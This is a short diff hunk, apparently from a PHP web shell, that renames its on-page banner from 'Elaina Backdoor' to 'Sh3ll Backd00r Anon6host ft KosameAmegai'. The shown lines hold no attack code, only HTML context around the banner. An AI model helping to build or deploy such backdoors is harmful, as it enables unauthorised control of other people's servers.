@@ -210,7 +210,7 @@ async function loadFile(file) {
 
 </script>
 <center>
-<font face="Bungee" size="5">./Elaina Backdoor\.</font></center>
+<font face="Bungee" size="5">Sh3ll Backd00r Anon6host ft KosameAmegai</font></center>
 <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>
 <?php
